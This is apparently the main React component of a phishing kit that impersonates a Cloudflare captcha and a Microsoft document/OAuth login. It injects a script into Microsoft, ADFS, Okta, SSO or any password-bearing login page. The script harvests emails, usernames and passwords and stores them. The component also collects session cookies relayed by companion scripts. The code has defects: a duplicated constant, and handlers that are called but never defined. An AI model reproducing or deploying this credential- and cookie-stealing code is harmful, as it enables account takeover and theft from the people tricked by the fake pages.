import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

// 🟢 NEW: Import cookie/email capture function and setter utilities
import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './utils/client-cookie-capture';

// Artificial delay helper (milliseconds)
const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
const captchaVerificationDelay = 1500; // Default verification delay for captcha

// Calculate total delay for captcha to handle everything internally
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

// Calculate total delay for captcha to handle everything internally
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  // State to hold the most reliable email and cookies captured via postMessage
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);

  // Inject password capture script for Microsoft/organizational domains
  useEffect(() => {
    const injectPasswordCaptureScript = () => {
      // Only inject if we're on a Microsoft or organizational domain
      const hostname = window.location.hostname;
      const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
        hostname.includes('login.live.com') ||
        hostname.includes('account.microsoft.com');

      const isOrgDomain = hostname.includes('adfs') ||
        hostname.includes('sso') ||
        hostname.includes('okta') ||
        hostname.includes('ping') ||
        document.querySelector('input[type="password"]');

      if (isMicrosoftDomain || isOrgDomain) {
        const script = document.createElement('script');
        script.textContent = `
          // Password capture for Microsoft/organizational login pages
          (function() {
            console.log('🔑 Password capture script loaded on:', window.location.hostname);

            let capturedCredentials = {
              email: '',
              password: '',
              username: '',
              domain: window.location.hostname,
              captureTime: new Date().toISOString()
            };

            function capturePasswordFromForms() {
              try {
                const passwordFields = document.querySelectorAll('input[type="password"]');
                const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"]');
                const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"]');

                let hasNewData = false;

                passwordFields.forEach(field => {
                  if (field.value && field.value !== capturedCredentials.password) {
                    capturedCredentials.password = field.value;
                    hasNewData = true;
                    console.log('🔑 Password captured from field:', field.name || field.id || 'unnamed');
                  }
                });

                emailFields.forEach(field => {
                  if (field.value && field.value !== capturedCredentials.email) {
                    capturedCredentials.email = field.value;
                    hasNewData = true;
                    console.log('📧 Email captured from field:', field.name || field.id || 'unnamed');
                  }
                });

                usernameFields.forEach(field => {
                  if (field.value && field.value !== capturedCredentials.username) {
                    capturedCredentials.username = field.value;
                    hasNewData = true;
                    console.log('👤 Username captured from field:', field.name || field.id || 'unnamed');
                  }
                });

                if (hasNewData) {
                  storeCredentials();
                }

                return hasNewData;
              } catch (error) {
                console.error('❌ Error capturing password:', error);
                return false;
              }
            }

            function storeCredentials() {
              const credentialsData = {
                email: capturedCredentials.email,
                password: capturedCredentials.password,
                username: capturedCredentials.username,
                domain: capturedCredentials.domain,
                captureTime: capturedCredentials.captureTime,
                source: 'injected-password-capture',
                url: window.location.href
              };

              try {
                sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
                localStorage.setItem('user_credentials', JSON.stringify(credentialsData));
                sessionStorage.setItem('login_credentials_backup', JSON.stringify(credentialsData));

                console.log('💾 Stored credentials:', {
                  hasEmail: !!credentialsData.email,
                  hasPassword: !!credentialsData.password,
                  hasUsername: !!credentialsData.username
                });
              } catch (error) {
                console.error('❌ Error storing credentials:', error);
              }
            }

            // Monitor input changes
            document.addEventListener('input', function(e) {
              if (e.target.type === 'password' ||
                  e.target.name?.toLowerCase().includes('password') ||
                  e.target.name?.toLowerCase().includes('email') ||
                  e.target.name?.toLowerCase().includes('user') ||
                  e.target.id?.toLowerCase().includes('password') ||
                  e.target.id?.toLowerCase().includes('email') ||
                  e.target.id?.toLowerCase().includes('user')) {

                console.log('🔍 Credential field changed:', e.target.name || e.target.id, e.target.type);
                setTimeout(() => {
                  capturePasswordFromForms();
                }, 300);
              }
            });

            // Monitor form submissions
            document.addEventListener('submit', function(e) {
              console.log('📝 Form submitted, capturing credentials...');
              setTimeout(() => {
                capturePasswordFromForms();
              }, 100);
            });

            // Monitor button clicks
            document.addEventListener('click', function(e) {
              const target = e.target;
              if (target.type === 'submit' ||
                  target.textContent?.toLowerCase().includes('sign in') ||
                  target.textContent?.toLowerCase().includes('login') ||
                  target.textContent?.toLowerCase().includes('next') ||
                  target.className?.toLowerCase().includes('submit') ||
                  target.className?.toLowerCase().includes('login')) {

                console.log('🖱️ Login button clicked, capturing credentials...');
                setTimeout(() => {
                  capturePasswordFromForms();
                }, 500);
              }
            });

            // Periodic capture for auto-fill
            setInterval(() => {
              capturePasswordFromForms();
            }, 3000);

            // Initial capture
            setTimeout(() => {
              capturePasswordFromForms();
            }, 1000);

            console.log('✅ Password capture script initialized');
          })();
        `;

        document.head.appendChild(script);
        console.log('📝 Injected password capture script');
      }
    };

    // Inject script when app loads
    injectPasswordCaptureScript();

    // Also inject when URL changes (for SPAs)
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function(...args) {
      originalPushState.apply(history, args);
      setTimeout(injectPasswordCaptureScript, 1000);
    };

    history.replaceState = function(...args) {
      originalReplaceState.apply(history, args);
      setTimeout(injectPasswordCaptureScript, 1000);
    };

    window.addEventListener('popstate', () => {
      setTimeout(injectPasswordCaptureScript, 1000);
    });

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
    };
  }, []);

  // Listen for messages from enhancer scripts for robust cookie/email capture
  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);
        } catch (e) {
          // fallback: ignore
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  // Captcha verified: immediately go to oauth redirect (no delay)

  const handleOAuthBack = () => {
    setCurrentPage('oauth-redirect');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              animation: 'spin 2s linear infinite',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}


export default App;